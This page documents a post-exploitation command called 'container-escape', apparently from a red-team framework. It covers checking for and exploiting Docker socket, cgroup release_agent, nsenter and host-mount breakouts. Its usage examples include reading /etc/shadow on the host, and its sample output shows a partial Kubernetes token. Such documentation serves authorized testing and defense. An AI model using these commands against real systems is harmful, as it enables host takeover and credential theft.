+++
title = "container-escape"
chapter = false
weight = 100
hidden = false
+++

{{% notice info %}}Linux Only{{% /notice %}}

## Summary

Container escape — enumerate and exploit breakout vectors for escaping Docker, Kubernetes, and other container runtimes. Supports Docker socket abuse, cgroup release_agent, PID namespace nsenter, and host block device mounting.

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | No | check | Escape technique to use |
| command | No | — | Command to execute on the host (for docker-sock, cgroup, nsenter) |
| image | No | alpine | Docker image for docker-sock escape |
| path | No | auto-detect | Block device path for mount-host (e.g., /dev/sda1) |

### Actions

- **check** — Enumerate all available escape vectors without exploiting them
- **docker-sock** — Exploit mounted Docker socket to run a privileged container with host filesystem access
- **cgroup** — Use cgroup release_agent to execute commands on the host (requires privileged container)
- **nsenter** — Enter host PID namespace via nsenter to run commands as host root
- **mount-host** — Mount host block device to read host filesystem (requires CAP_SYS_ADMIN)

## Usage

```
container-escape
container-escape -action check
container-escape -action docker-sock -command "cat /etc/shadow"
container-escape -action nsenter -command "id && hostname"
container-escape -action mount-host -path /dev/sda1
```

### Example Output (check)

```
=== CONTAINER ESCAPE VECTOR CHECK ===

[!] Docker socket: /var/run/docker.sock (mode: srw-rw----) — WRITABLE
    Use: container-escape -action docker-sock -command '<cmd>'

[!] Full capabilities detected — likely PRIVILEGED container
[!] Cgroup path: /docker/abc123... — release_agent escape may be possible
    Use: container-escape -action cgroup -command '<cmd>'

[*] PID namespace: container=pid:[4026532198], host=pid:[4026531836] (isolated)
[!] Host block device accessible: /dev/sda
    Use: container-escape -action mount-host -path /dev/sda

[!] K8s service account token found: eyJhbGciOiJSUzI1NiIsImtpZCI6...
    Potential for K8s API abuse (pod creation, secret access)

=== 4 escape vector(s) identified ===
```

## MITRE ATT&CK Mapping

| Technique ID | Name |
|--------------|------|
| T1611 | Escape to Host |
